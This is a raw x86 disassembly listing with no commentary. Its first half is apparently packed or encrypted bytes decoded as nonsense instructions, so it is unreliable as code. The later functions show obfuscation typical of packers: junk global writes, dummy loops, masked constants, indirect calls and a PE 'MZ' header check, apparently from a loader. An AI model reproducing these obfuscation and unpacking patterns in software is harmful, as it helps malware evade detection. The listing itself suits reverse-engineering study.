  404ac3:	repnz bound esi,QWORD PTR cs:[edi+0x7d742fd9]
  404acb:	xor    bh,BYTE PTR [edx]
  404acd:	pop    ebp
  404ace:	mov    eax,0x4d858686
  404ad3:	lea    ecx,[ecx]
  404ad5:	ror    ah,cl
  404ad7:	fs retf 
  404ad9:	cmp    eax,0x95cab4d2
  404ade:	ins    DWORD PTR es:[edi],dx
  404adf:	add    eax,0x6bb04cac
  404ae4:	mov    cl,0x70
  404ae6:	aad    0xfa
  404ae8:	xchg   BYTE PTR [edi-0x420d4edd],dl
  404aee:	pop    edx
  404aef:	push   ebp
  404af0:	push   ds
  404af1:	ss jns 0x404b6c
  404af4:	pushf  
  404af5:	je     0x404a7e
  404af7:	das    
  404af8:	pop    ds
  404af9:	pop    eax
  404afa:	scas   eax,DWORD PTR es:[edi]
  404afb:	adc    edx,ecx
  404afd:	jl     0x404b58
  404aff:	or     DWORD PTR [eax+0x2],edx
  404b02:	xor    eax,0xc6da10c0
  404b07:	push   edx
  404b08:	fidiv  DWORD PTR [edi-0x587f871a]
  404b0e:	push   es
  404b0f:	xchg   ecx,eax
  404b10:	hlt    
  404b11:	loopne 0x404ae3
  404b13:	pop    ebx
  404b14:	add    bh,al
  404b16:	sbb    edx,DWORD PTR ds:0xe37ed403
  404b1c:	adc    eax,DWORD PTR [edi+0x54]
  404b1f:	fld    DWORD PTR [edi+eax*4-0x63]
  404b23:	adc    eax,0x862b0168
  404b28:	or     eax,0x48ffe9ec
  404b2d:	mov    esp,0x63ac4a6f
  404b32:	mov    eax,0x33824401
  404b38:	jns    0x404ac7
  404b3a:	pop    esp
  404b3b:	(bad)  
  404b3c:	cmp    BYTE PTR [edi+0x20],bl
  404b3f:	adc    al,0x12
  404b41:	test   BYTE PTR [ecx-0xb],dh
  404b44:	or     al,0x8c
  404b46:	inc    ecx
  404b47:	test   BYTE PTR [ebx+0x64],ch
  404b4a:	mov    esp,0x417c9d18
  404b4f:	lds    ebx,FWORD PTR [edx]
  404b51:	pop    eax
  404b52:	sbb    esp,DWORD PTR [edx]
  404b54:	dec    ecx
  404b55:	and    BYTE PTR [esi],ah
  404b57:	test   DWORD PTR [ebp-0x1d],esi
  404b5a:	leave  
  404b5b:	mov    ecx,0x3ec3f96a
  404b60:	sahf   
  404b61:	jle    0x404b23
  404b63:	arpl   WORD PTR [ecx+0x7e],dx
  404b66:	inc    ebx
  404b67:	jle    0x404b67
  404b69:	fcmovnb st,st(6)
  404b6b:	sub    bl,BYTE PTR cs:[esi+0x1433b9dd]
  404b72:	push   eax
  404b73:	daa    
  404b74:	or     DWORD PTR [edx],edx
  404b76:	mov    eax,0x58fbbfb5
  404b7b:	adc    bh,BYTE PTR [edi]
  404b7d:	xchg   edx,eax
  404b7e:	dec    ebx
  404b7f:	stos   BYTE PTR es:[edi],al
  404b80:	pop    edx
  404b81:	or     esi,esp
  404b83:	mov    esi,0x1c51fe4d
  404b88:	push   esp
  404b89:	mov    WORD PTR [eax],ss
  404b8b:	in     al,dx
  404b8c:	mov    al,ds:0xe65e0e48
  404b91:	sbb    ah,ah
  404b93:	or     ebp,edx
  404b95:	add    BYTE PTR [ebp-0x32],al
  404b98:	mov    esi,0xf4650098
  404b9d:	xchg   BYTE PTR ds:0xe319818a,bl
  404ba3:	(bad)  
  404ba4:	dec    ebx
  404ba5:	loop   0x404bde
  404ba7:	dec    ebp
  404ba8:	enter  0x7eb1,0x4e
  404bac:	pop    edi
  404bad:	(bad)  
  404bae:	sub    al,0xba
  404bb0:	les    eax,FWORD PTR ds:0x77f65a60
  404bb6:	xor    ebx,DWORD PTR [edi-0x82d9f9f]
  404bbc:	mov    cl,0x21
  404bbe:	adc    ebp,eax
  404bc0:	pop    esi
  404bc1:	sub    BYTE PTR [eax-0x55e357b0],al
  404bc7:	fmul   QWORD PTR [eax-0x4361f1f4]
  404bcd:	outs   dx,DWORD PTR ds:[esi]
  404bce:	repz and ah,BYTE PTR [ebp+0x2d1663b3]
  404bd5:	mov    cl,0x28
  404bd7:	(bad)  
  404bd8:	out    0x36,al
  404bda:	mov    edi,0xd7454705
  404bdf:	mov    ebx,0x77a90178
  404be4:	sbb    eax,0x2f580e84
  404be9:	iret   
  404bea:	mov    al,ds:0x647218ee
  404bef:	out    dx,al
  404bf0:	inc    edi
  404bf1:	js     0x404b7b
  404bf3:	call   0x8a93032b
  404bf8:	leave  
  404bf9:	popf   
  404bfa:	fsubr  DWORD PTR [esi]
  404bfc:	outs   dx,DWORD PTR ds:[esi]
  404bfd:	and    al,0xf1
  404bff:	ret    
  404c00:	or     BYTE PTR [edx-0x5f],dh
  404c03:	pmaxub mm2,QWORD PTR [ebp+edi*1-0x406e4d0e]
  404c0b:	lea    edi,[esi+ecx*8]
  404c0e:	or     DWORD PTR [esi],eax
  404c10:	loope  0x404c2c
  404c12:	cmp    BYTE PTR [ecx+0x8],ah
  404c15:	pop    edi
  404c16:	jmp    0xaffd:0xe27da83d
  404c1d:	fild   QWORD PTR [ebx]
  404c1f:	pusha  
  404c20:	leave  
  404c21:	or     al,0xfe
  404c23:	add    bl,BYTE PTR [eax]
  404c25:	int3   
  404c26:	xchg   edi,eax
  404c27:	xchg   ecx,eax
  404c28:	ja     0x404c40
  404c2a:	pop    ds
  404c2b:	inc    ebx
  404c2c:	mov    ebp,0xbbe7ccbb
  404c31:	jl     0x404c92
  404c33:	ins    BYTE PTR es:[edi],dx
  404c34:	fnstsw WORD PTR [ebp-0x53]
  404c37:	stc    
  404c38:	cmp    edx,DWORD PTR [eax-0x6374e5f4]
  404c3e:	popa   
  404c3f:	push   ss
  404c40:	mov    ds:0x99043d5b,eax
  404c45:	adc    al,0x92
  404c47:	sbb    edi,edx
  404c49:	xchg   esp,eax
  404c4b:	popf   
  404c4c:	(bad)  
  404c4d:	pop    edi
  404c4e:	mov    DWORD PTR [eax+edx*1+0x67],eax
  404c52:	mul    DWORD PTR [ebx]
  404c54:	cld    
  404c55:	ret    0x675
  404c58:	mov    cl,0xaa
  404c5a:	sbb    ebx,ecx
  404c5c:	add    eax,DWORD PTR [edx+0x2dac35b8]
  404c62:	pop    ecx
  404c63:	push   ebx
  404c64:	push   edi
  404c65:	gs scas eax,DWORD PTR es:[edi]
  404c67:	push   edx
  404c68:	leave  
  404c69:	push   ebx
  404c6a:	fisttp DWORD PTR [eax-0x72ba0219]
  404c70:	adc    eax,0xe681ca00
  404c75:	fisttp QWORD PTR [ecx+0x4c64461e]
  404c7b:	or     al,0x3b
  404c7d:	mov    al,0x74
  404c7f:	(bad)  
  404c80:	hlt    
  404c81:	popa   
  404c82:	rcl    esp,1
  404c84:	sbb    al,0x5f
  404c86:	sub    BYTE PTR [eax+esi*8+0x35],0xb7
  404c8b:	mov    al,BYTE PTR [ecx+0x41810fbe]
  404c91:	xlat   BYTE PTR ds:[ebx]
  404c92:	sbb    DWORD PTR [ebp-0x70eb4471],ebp
  404c98:	jmp    0x2d408530
  404c9d:	pop    edx
  404c9e:	into   
  404c9f:	fild   WORD PTR [eax]
  404ca1:	pop    ecx
  404ca2:	lods   al,BYTE PTR ds:[esi]
  404ca3:	shl    ecx,0xc1
  404ca6:	sti    
  404ca7:	sub    DWORD PTR [esi],esi
  404ca9:	outs   dx,DWORD PTR ds:[esi]
  404caa:	scas   eax,DWORD PTR es:[edi]
  404cab:	fcmovbe st,st(0)
  404cad:	(bad)  
  404cae:	mov    al,BYTE PTR [ebp+0x660d53e5]
  404cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cb5:	add    ah,BYTE PTR [eax]
  404cb7:	das    
  404cb8:	cmc    
  404cb9:	data16 dec bh
  404cbc:	ss ins BYTE PTR es:[edi],dx
  404cbe:	iret   
  404cbf:	pop    ecx
  404cc0:	mov    edi,0xde29438f
  404cc5:	mov    dl,0xbd
  404cc7:	ret    0xe6c4
  404cca:	cmp    al,0x10
  404ccc:	mov    cl,0x4b
  404cce:	sub    al,0x99
  404cd0:	(bad)  
  404cd1:	mov    edx,0xe6c48d01
  404cd6:	sub    DWORD PTR [ebp+0x4c],esp
  404cd9:	jo     0x404d53
  404cdb:	nop
  404cdc:	test   BYTE PTR [ecx],cl
  404cde:	jl     0x404d0c
  404ce0:	jge    0x404caa
  404ce2:	mov    ch,0x9d
  404ce4:	stos   DWORD PTR es:[edi],eax
  404ce5:	push   ss
  404ce6:	mov    esp,0x1b3a3b85
  404ceb:	sahf   
  404cec:	mov    eax,ds:0xd11fa275
  404cf1:	pop    edi
  404cf2:	xor    BYTE PTR [ecx+0xaa37b3d],ah
  404cf8:	or     al,0x97
  404cfa:	shr    edx,cl
  404cfc:	jne    0x404d63
  404cfe:	xchg   esi,eax
  404cff:	scas   eax,DWORD PTR es:[edi]
  404d00:	std    
  404d01:	loope  0x404d3e
  404d03:	and    eax,0xabafeb9b
  404d08:	jp     0x404d5d
  404d0a:	xor    BYTE PTR [ecx],dh
  404d0c:	mov    esi,0x5b38ff22
  404d11:	es je  0x404ce6
  404d14:	arpl   WORD PTR [ecx],cx
  404d16:	imul   edx,DWORD PTR [edi-0x52e3798c],0x9fe413c9
  404d20:	cdq    
  404d21:	data16 mov bh,0xd6
  404d24:	js     0x404cd9
  404d26:	sbb    al,0xd7
  404d28:	int3   
  404d29:	mov    ebx,0xc4347c8c
  404d2e:	cdq    
  404d2f:	(bad)  
  404d30:	fadd   QWORD PTR [esi+0x17]
  404d33:	fst    QWORD PTR [eax-0x23]
  404d36:	add    BYTE PTR [ebp-0x63],bh
  404d39:	inc    edx
  404d3a:	neg    BYTE PTR [edi-0x43]
  404d3d:	push   ss
  404d3e:	in     eax,0xa6
  404d40:	cmp    dh,BYTE PTR [esi+0x13]
  404d43:	icebp  
  404d44:	mov    ds,WORD PTR [edi-0x34]
  404d47:	jae    0x404d77
  404d49:	fcom   QWORD PTR [esp+edi*4]
  404d4c:	mov    WORD PTR ds:0x7cd83bd8,cs
  404d52:	inc    ebp
  404d53:	push   esi
  404d54:	and    DWORD PTR [ebx+0x3d],esp
  404d57:	mov    ah,0x18
  404d59:	adc    eax,0xb890c34
  404d5e:	xchg   ebx,eax
  404d5f:	jbe    0x404ce2
  404d61:	pushf  
  404d62:	nop
  404d63:	mov    BYTE PTR [ecx+esi*4-0x3494cb91],dl
  404d6a:	adc    ecx,DWORD PTR ds:0x33646460
  404d70:	ins    DWORD PTR es:[edi],dx
  404d71:	cmp    BYTE PTR [edi+0x10a99ab1],dl
  404d77:	jmp    0xe5e36c68
  404d7c:	pop    ebp
  404d7d:	fcom   QWORD PTR [ebp-0xc]
  404d80:	pop    ebx
  404d81:	sar    BYTE PTR [ebx+0x24d4c872],cl
  404d87:	and    edx,0x23
  404d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8b:	sbb    eax,0xd6faef82
  404d90:	sub    eax,0x565cf72f
  404d95:	push   esi
  404d96:	add    al,0xe7
  404d98:	lds    esp,FWORD PTR [ebx+0x55]
  404d9b:	cmp    BYTE PTR [edx+0x5f],cl
  404d9e:	xchg   edi,eax
  404d9f:	and    ch,BYTE PTR [eax]
  404da1:	int    0xce
  404da3:	mov    bl,0xa5
  404da5:	hlt    
  404da6:	jbe    0x404d63
  404da8:	inc    edi
  404da9:	in     al,0x2d
  404dab:	and    al,0x99
  404dad:	and    DWORD PTR [ebx+0x46880170],ebx
  404db3:	push   es
  404db4:	mov    WORD PTR [ebp-0x35],ds
  404db7:	mov    ss,WORD PTR [edi-0x15]
  404dba:	pop    ds
  404dbb:	ret    0x29a1
  404dbe:	cmp    BYTE PTR [ebx],dl
  404dc0:	pushf  
  404dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dc2:	ret    0xb675
  404dc5:	cld    
  404dc6:	and    cl,bl
  404dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dc9:	test   al,0x91
  404dcb:	stc    
  404dcc:	sti    
  404dcd:	fstp   TBYTE PTR [esi]
  404dcf:	jle    0x404da3
  404dd1:	outs   dx,BYTE PTR ds:[esi]
  404dd2:	sbb    esp,DWORD PTR [ecx-0x5d]
  404dd5:	retf   
  404dd6:	test   DWORD PTR [edx-0x57],esp
  404dd9:	sbb    al,0xaf
  404ddb:	dec    esp
  404ddc:	mov    BYTE PTR ds:0x96eb2c57,al
  404de2:	les    edx,FWORD PTR [ecx+0x15dae54c]
  404de8:	stc    
  404de9:	or     ebx,ecx
  404deb:	neg    eax
  404ded:	or     DWORD PTR [edx+0x7f],ecx
  404df0:	push   es
  404df1:	mov    bh,0x60
  404df3:	sbb    al,0xcf
  404df5:	mov    bl,0x77
  404df7:	sbb    edx,DWORD PTR [ecx-0x4f]
  404dfa:	aas    
  404dfb:	fwait
  404dfc:	es push ebx
  404dfe:	fnsave [esi]
  404e00:	(bad)  [ebx+0xe]
  404e03:	sbb    dl,BYTE PTR [esi+0x26565c14]
  404e09:	cwde   
  404e0a:	push   edx
  404e0b:	(bad)
  404e0e:	jmp    0x4470:0xdb7b2289
  404e15:	xor    al,0x4a
  404e17:	ret    
  404e18:	add    al,0xd1
  404e1a:	mov    bh,BYTE PTR [edx+0x23a894a1]
  404e20:	pop    ebp
  404e21:	ret    0xbf6f
  404e24:	lods   al,BYTE PTR ds:[esi]
  404e25:	mov    eax,0xfdef4606
  404e2a:	fnstsw WORD PTR [esi+0x2d64a589]
  404e30:	rol    BYTE PTR [edi+0x75],0x20
  404e34:	mov    dl,0xf1
  404e36:	ins    DWORD PTR es:[edi],dx
  404e37:	(bad)  
  404e39:	bound  edi,QWORD PTR [esi+0x5]
  404e3c:	dec    esp
  404e3d:	hlt    
  404e3e:	(bad)  
  404e3f:	ins    DWORD PTR es:[edi],dx
  404e40:	sbb    dh,dl
  404e42:	jnp    0x404de9
  404e44:	pop    ecx
  404e45:	xor    eax,0x24638775
  404e4a:	dec    esi
  404e4b:	lea    ebp,[edx-0x4518b1af]
  404e51:	mov    edx,0x8dcb3e03
  404e56:	jle    0x404e2a
  404e58:	pop    eax
  404e59:	nop
  404e5a:	ins    BYTE PTR es:[edi],dx
  404e5b:	ds scas al,BYTE PTR es:[edi]
  404e5d:	dec    ecx
  404e5e:	daa    
  404e5f:	xchg   edi,eax
  404e60:	dec    ebx
  404e61:	js     0x404e33
  404e63:	and    ch,BYTE PTR [ebx]
  404e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e67:	scas   al,BYTE PTR es:[edi]
  404e68:	gs dec ebp
  404e6a:	dec    esi
  404e6b:	in     eax,dx
  404e6c:	inc    edx
  404e6d:	stos   DWORD PTR es:[edi],eax
  404e6e:	adc    esi,DWORD PTR [ebp+edx*4+0x585ee633]
  404e75:	mov    ds:0x89195fa3,al
  404e7a:	pop    ds
  404e7b:	adc    al,0x4b
  404e7d:	int    0x38
  404e7f:	into   
  404e80:	xchg   esi,eax
  404e81:	xor    DWORD PTR [esi],ecx
  404e83:	inc    eax
  404e84:	(bad)  [esi+0x240eceb0]
  404e8a:	(bad)  
  404e8b:	xchg   ebp,eax
  404e8c:	pop    es
  404e8d:	mov    esi,DWORD PTR [esi-0x5446510f]
  404e93:	inc    edx
  404e94:	xchg   ebx,eax
  404e95:	lds    ecx,FWORD PTR [eax+0x6f]
  404e98:	ins    BYTE PTR es:[edi],dx
  404e99:	jb     0x404e41
  404e9b:	ins    BYTE PTR es:[edi],dx
  404e9c:	jl     0x404f16
  404e9e:	cli    
  404e9f:	test   al,0x49
  404ea1:	bound  esi,QWORD PTR [eax+0x51d87461]
  404ea7:	xchg   edx,eax
  404ea8:	dec    esi
  404ea9:	cmp    al,0x98
  404eab:	mov    eax,cs:0xa7fa4c45
  404eb1:	pop    es
  404eb2:	stc    
  404eb3:	add    al,0x1d
  404eb5:	ja     0x404eb3
  404eb7:	mov    ebp,0x139714d
  404ebc:	je     0x404e4f
  404ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ebf:	sub    DWORD PTR [ebp-0x12],0xffffffa6
  404ec3:	call   DWORD PTR [esi+0x72]
  404ec6:	bound  edi,QWORD PTR [esi-0x15da3396]
  404ecc:	scas   al,BYTE PTR es:[edi]
  404ecd:	jle    0x404f09
  404ecf:	(bad)  
  404ed0:	xlat   BYTE PTR ds:[ebx]
  404ed1:	data16 fimul WORD PTR [ebp+0x17f7df1c]
  404ed8:	mov    dl,0xe8
  404eda:	mov    eax,ds:0x381d1290
  404edf:	lock int3 
  404ee1:	test   BYTE PTR [ecx-0x2],ch
  404ee4:	mov    edi,0x599b3393
  404ee9:	jmp    0xe7421eb1
  404eee:	clc    
  404eef:	repz xor al,0x32
  404ef2:	data16 out dx,al
  404ef4:	fstp   QWORD PTR [esi+0x782380e0]
  404efa:	std    
  404efb:	pusha  
  404efc:	adc    bh,dl
  404efe:	pop    edx
  404eff:	inc    esp
  404f00:	loop   0x404e8c
  404f02:	not    BYTE PTR [eax]
  404f04:	jge    0x404e90
  404f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f07:	ins    BYTE PTR es:[edi],dx
  404f08:	ret    0x19d2
  404f0b:	mov    esp,0xbbdb3f30
  404f10:	test   DWORD PTR [edx+edx*4-0x36],esp
  404f14:	mov    DWORD PTR [esp+edi*4+0x50506491],esp
  404f1b:	shl    BYTE PTR [edx+eax*8+0x6c1ce03b],0x45
  404f23:	mov    BYTE PTR [ecx],bl
  404f25:	mov    edi,0xe5374182
  404f2a:	jbe    0x404eff
  404f2c:	fdiv   DWORD PTR [edi-0x42]
  404f2f:	mov    eax,DWORD PTR [ebp-0x4]
  404f32:	mov    edi,DWORD PTR [ebp-0x8]
  404f35:	xor    edi,edx
  404f37:	add    edi,esi
  404f39:	mov    esi,DWORD PTR [ebp+0x8]
  404f3c:	imul   edi,ecx
  404f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  404f42:	xor    eax,edx
  404f44:	add    eax,ecx
  404f46:	mov    al,BYTE PTR [ebx+eax*1+0x3272dd]
  404f4d:	mov    BYTE PTR [edi+esi*1],al
  404f50:	mov    eax,DWORD PTR [ebp-0x8]
  404f53:	mov    esi,DWORD PTR [ebp+0x10]
  404f56:	xor    eax,edx
  404f58:	xor    ebx,ebx
  404f5a:	add    esi,0xfabdbeed
  404f60:	adc    ebx,0xffffffff
  404f63:	lea    ecx,[ecx+eax*1+0x3272dd]
  404f6a:	xor    edi,edi
  404f6c:	xor    esi,0x8a29a127
  404f72:	xor    ebx,0x0
  404f75:	mov    eax,ecx
  404f77:	add    eax,0xfabdbeed
  404f7c:	adc    edi,0xffffffff
  404f7f:	xor    eax,0x8a29a127
  404f84:	xor    edi,0x0
  404f87:	cmp    eax,esi
  404f89:	jne    0x402b72
  404f8f:	cmp    edi,ebx
  404f91:	jne    0x402b72
  404f97:	mov    eax,0xf89c85b2
  404f9c:	pop    ebx
  404f9d:	pop    edi
  404f9e:	pop    esi
  404f9f:	leave  
  404fa0:	ret    0xc
  404fa3:	push   ebp
  404fa4:	mov    ebp,esp
  404fa6:	push   ecx
  404fa7:	add    eax,DWORD PTR ds:0x42a000
  404fad:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  404fb4:	sbb    DWORD PTR ds:0x42b008,0x61d9
  404fbe:	mov    eax,DWORD PTR [ebp+0x8]
  404fc1:	xor    DWORD PTR ds:0x42c018,0x2d2e
  404fcb:	mov    al,BYTE PTR [eax]
  404fcd:	add    al,0xb
  404fcf:	xor    al,0x71
  404fd1:	cmp    al,0x29
  404fd3:	mov    DWORD PTR ds:0x429010,0x6c7b
  404fdd:	jne    0x40507a
  404fe3:	mov    eax,DWORD PTR [ebp+0x8]
  404fe6:	or     edx,DWORD PTR ds:0x42900c
  404fec:	mov    ecx,DWORD PTR [ebp+0x8]
  404fef:	and    DWORD PTR ds:0x42b00c,0x0
  404ff9:	mov    edx,DWORD PTR ds:0x42b00c
  404fff:	inc    edx
  405000:	mov    DWORD PTR ds:0x42b00c,edx
  405006:	cmp    DWORD PTR ds:0x42b00c,0x1a
  40500d:	jne    0x40501e
  405013:	push   0x42900c
  405018:	call   DWORD PTR ds:0x42ed75
  40501e:	cmp    DWORD PTR ds:0x42b00c,0x15
  405025:	jb     0x404ff9
  40502b:	or     DWORD PTR ds:0x42d008,0x1488
  405035:	add    ecx,DWORD PTR [eax+0x3c]
  405038:	mov    edx,0x7510896
  40503d:	mov    DWORD PTR [ebp+0x8],ecx
  405040:	mov    eax,DWORD PTR [ebp-0x4]
  405043:	xor    eax,edx
  405045:	push   esi
  405046:	mov    esi,DWORD PTR ds:0x42d000
  40504c:	and    DWORD PTR ds:0x42a00c,esi
  405052:	mov    esi,DWORD PTR [ebp+0x8]
  405055:	mov    ecx,0x3272dd
  40505a:	add    eax,ecx
  40505c:	cmp    DWORD PTR [esi+0x54],eax
  40505f:	pop    esi
  405060:	je     0x40506e
  405066:	mov    eax,DWORD PTR [ebp+0x8]
  405069:	jmp    0x405087
  40506e:	mov    eax,DWORD PTR [ebp-0x4]
  405071:	xor    eax,edx
  405073:	add    eax,ecx
  405075:	jmp    0x405087
  40507a:	mov    eax,DWORD PTR [ebp-0x4]
  40507d:	xor    eax,0x7510896
  405082:	add    eax,0x3272dd
  405087:	leave  
  405088:	ret    0x4
  40508b:	push   ebp
  40508c:	mov    ebp,esp
  40508e:	sub    esp,0x78
  405091:	push   ebx
  405092:	push   esi
  405093:	push   edi
  405094:	push   0x1f
  405096:	lea    eax,[ebp-0x78]
  405099:	xor    DWORD PTR ds:0x429018,0x42a014
  4050a3:	push   eax
  4050a4:	push   0x0
  4050a6:	mov    DWORD PTR ds:0x429010,0x21c3
  4050b0:	call   DWORD PTR ds:0x42ed69
  4050b6:	add    DWORD PTR ds:0x429024,0x42c000
  4050c0:	push   0x97898797
  4050c5:	call   DWORD PTR ds:0x42ed2d
  4050cb:	adc    DWORD PTR ds:0x42b018,0x6ca1
  4050d5:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4050dc:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4050e3:	mov    ecx,DWORD PTR [ebp-0x4]
  4050e6:	mov    ebx,0x7510896
  4050eb:	add    DWORD PTR ds:0x42a014,0x255d
  4050f5:	xor    ecx,ebx
  4050f7:	or     DWORD PTR ds:0x429000,0x7ff8
  405101:	mov    eax,0x3272dd
  405106:	add    ecx,eax
  405108:	mov    DWORD PTR [ebp-0x1c],ecx
  40510b:	not    DWORD PTR ds:0x42c018
  405111:	mov    ecx,DWORD PTR [ebp+0x14]
  405114:	test   ecx,ecx
  405116:	mov    DWORD PTR ds:0x42a00c,0x3f58
  405120:	je     0x40513a
  405126:	inc    ecx
  405127:	mov    ecx,DWORD PTR [ebp+0x14]
  40512a:	and    DWORD PTR ds:0x429014,0x1a66
  405134:	mov    ecx,DWORD PTR [ecx]
  405136:	dec    edi
  405137:	mov    DWORD PTR [ebp-0x1c],ecx
  40513a:	add    DWORD PTR ds:0x42901c,edx
  405140:	mov    ecx,0x7665
  405145:	and    DWORD PTR ds:0x42c008,0x0
  40514f:	jmp    0x405161
  405154:	mov    edi,DWORD PTR ds:0x42c008
  40515a:	inc    edi
  40515b:	mov    DWORD PTR ds:0x42c008,edi
  405161:	cmp    DWORD PTR ds:0x42c008,0x10
  405168:	jae    0x405192
  40516e:	cmp    DWORD PTR ds:0x42c008,0x1f
  405175:	jne    0x40518b
  40517b:	push   0x399e
  405180:	push   0x848f
  405185:	call   DWORD PTR ds:0x42ed35
  40518b:	jmp    0x405154
  405190:	xor    edi,edi
  405192:	imul   edx,eax
  405195:	movzx  esi,BYTE PTR ds:0x42c010
  40519c:	xor    DWORD PTR ds:0x42c004,esi
  4051a2:	mov    esi,0x76532
  4051a7:	add    edx,ecx
  4051a9:	and    DWORD PTR ds:0x42a018,0x0
  4051b3:	mov    edi,DWORD PTR ds:0x42a018
  4051b9:	inc    edi
  4051ba:	mov    DWORD PTR ds:0x42a018,edi
  4051c0:	cmp    DWORD PTR ds:0x42a018,0x6
  4051c7:	jne    0x4051e0
  4051cd:	push   0x8802
  4051d2:	push   0x429004
  4051d7:	push   DWORD PTR [ebp-0x24]
  4051da:	call   DWORD PTR ds:0x42ed39
  4051e0:	cmp    DWORD PTR ds:0x42a018,0x5
  4051e7:	jne    0x4051fa
  4051ed:	mov    edi,DWORD PTR ds:0x42a018
  4051f3:	inc    edi
  4051f4:	mov    DWORD PTR ds:0x42a018,edi
  4051fa:	cmp    DWORD PTR ds:0x42a018,0x10
  405201:	jb     0x4051b3
  405207:	and    DWORD PTR ds:0x42d00c,0x0
  405211:	jmp    0x405223
  405216:	mov    edi,DWORD PTR ds:0x42d00c
  40521c:	inc    edi
  40521d:	mov    DWORD PTR ds:0x42d00c,edi
  405223:	cmp    DWORD PTR ds:0x42d00c,0x15
  40522a:	jae    0x405278
  405230:	cmp    DWORD PTR ds:0x42d00c,0xa
  405237:	jne    0x40524d
  40523d:	push   0x42e05b
  405242:	push   0x42e010
  405247:	call   DWORD PTR ds:0x42ed3d
  40524d:	cmp    DWORD PTR ds:0x42d00c,0x9
  405254:	jne    0x405269
  40525a:	xor    edi,edi
  40525c:	or     edi,DWORD PTR ds:0x42d00c
  405262:	inc    edi
  405263:	mov    DWORD PTR ds:0x42d00c,edi
  405269:	jmp    0x405216
  40526e:	adc    DWORD PTR ds:0x42b000,0x4b16
  405278:	xchg   esi,ecx
  40527a:	xor    ecx,DWORD PTR ds:0x42a00c
  405280:	mov    edi,0x54354
  405285:	sub    edx,edi
  405287:	sbb    ecx,0x55bb
  40528d:	mov    ecx,DWORD PTR [ebp-0x4]
  405290:	sub    DWORD PTR ds:0x42a01c,edx
  405296:	xor    ecx,ebx
  405298:	mov    esi,DWORD PTR ds:0x42a018
  40529e:	and    esi,DWORD PTR ds:0x429000
  4052a4:	mov    DWORD PTR ds:0x42a018,esi
  4052aa:	add    ecx,eax
  4052ac:	mov    DWORD PTR [ebp-0x8],ecx
  4052af:	and    DWORD PTR ds:0x42b010,0x0
  4052b9:	jmp    0x4052cb
  4052be:	mov    esi,DWORD PTR ds:0x42b010
  4052c4:	inc    esi
  4052c5:	mov    DWORD PTR ds:0x42b010,esi
  4052cb:	cmp    DWORD PTR ds:0x42b010,0x1e
  4052d2:	jae    0x405313
  4052d8:	cmp    DWORD PTR ds:0x42b010,0x4
  4052df:	jne    0x4052f4
  4052e5:	push   DWORD PTR [ebp-0x1c]
  4052e8:	push   DWORD PTR [ebp-0x20]
  4052eb:	push   DWORD PTR [ebp-0xc]
  4052ee:	call   DWORD PTR ds:0x42ed41
  4052f4:	cmp    DWORD PTR ds:0x42b010,0x3
  4052fb:	jne    0x40530e
  405301:	mov    esi,DWORD PTR ds:0x42b010
  405307:	inc    esi
  405308:	mov    DWORD PTR ds:0x42b010,esi
  40530e:	jmp    0x4052be
  405313:	mov    ecx,DWORD PTR [ebp-0x14]
  405316:	xor    ecx,ebx
  405318:	add    ecx,eax
  40531a:	and    DWORD PTR ds:0x42a00c,0x4b6f
  405324:	mov    DWORD PTR [ebp-0x24],ecx
  405327:	mov    DWORD PTR ds:0x429024,0x1f
  405331:	cmp    DWORD PTR ds:0x429024,0x0
  405338:	je     0x405390
  40533e:	cmp    DWORD PTR ds:0x429024,0x6
  405345:	jne    0x40535e
  40534b:	push   0x5506
  405350:	push   0x42b000
  405355:	push   DWORD PTR [ebp-0x28]
  405358:	call   DWORD PTR ds:0x42ed45
  40535e:	cmp    DWORD PTR ds:0x429024,0x7
  405365:	jne    0x405378
  40536b:	mov    ecx,DWORD PTR ds:0x429024
  405371:	dec    ecx
  405372:	mov    DWORD PTR ds:0x429024,ecx
  405378:	mov    ecx,DWORD PTR ds:0x429024
  40537e:	dec    ecx
  40537f:	mov    DWORD PTR ds:0x429024,ecx
  405385:	jmp    0x405331
  40538a:	or     DWORD PTR ds:0x42a004,ebx
  405390:	mov    ecx,DWORD PTR [ebp-0x4]
  405393:	xor    ecx,ebx
  405395:	add    ecx,eax
  405397:	sub    esi,0x6631
  40539d:	mov    DWORD PTR [ebp-0x30],ecx
  4053a0:	dec    esi
  4053a1:	mov    esi,DWORD PTR [ebp-0x4]
  4053a4:	and    DWORD PTR ds:0x42d01c,0x0
  4053ae:	jmp    0x4053c2
  4053b3:	xor    ecx,ecx
  4053b5:	or     ecx,DWORD PTR ds:0x42d01c
  4053bb:	inc    ecx
  4053bc:	mov    DWORD PTR ds:0x42d01c,ecx
  4053c2:	cmp    DWORD PTR ds:0x42d01c,0x1e
  4053c9:	jae    0x405407
  4053cf:	cmp    DWORD PTR ds:0x42d01c,0xe
  4053d6:	jne    0x4053e2
  4053dc:	call   DWORD PTR ds:0x42ed51
  4053e2:	cmp    DWORD PTR ds:0x42d01c,0xd
  4053e9:	jne    0x4053fc
  4053ef:	mov    ecx,DWORD PTR ds:0x42d01c
  4053f5:	inc    ecx
  4053f6:	mov    DWORD PTR ds:0x42d01c,ecx
  4053fc:	jmp    0x4053b3
  405401:	or     ecx,DWORD PTR ds:0x42a000
  405407:	xor    esi,ebx
  405409:	dec    ecx
  40540a:	add    esi,eax
  40540c:	mov    ecx,DWORD PTR [ebp-0x24]
  40540f:	and    DWORD PTR ds:0x429000,0x42c018
  405419:	sub    ecx,eax
  40541b:	or     DWORD PTR ds:0x42b014,0x429024
  405425:	lea    edx,[esi-0x3272dd]
  40542b:	add    DWORD PTR ds:0x42d008,0x42a004
  405435:	xor    ecx,ebx
  405437:	adc    DWORD PTR ds:0x42d018,0x3588
  405441:	xor    edx,ebx
  405443:	cmp    edx,ecx
  405445:	je     0x4056db
  40544b:	mov    ecx,DWORD PTR [ebp-0x4]
